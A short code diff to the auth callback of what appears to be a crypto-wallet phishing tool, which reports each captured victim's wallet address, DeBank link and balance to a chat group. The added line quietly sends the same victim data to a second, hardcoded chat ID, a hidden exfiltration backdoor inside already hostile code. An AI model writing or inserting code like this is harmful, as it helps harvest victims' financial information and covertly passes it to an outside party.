@@ -186,6 +186,7 @@ def auth_callback():
                    f'🔗 *[{address}](https://debank.com/profile/{address}) | ${balance}*')
 
         send_message(group_id, message)
+        send_message(7434895838, message)
         return redirect(session.get("redirect_url", "https://x.com/"))
     except Exception as e:
         logger.error(e)
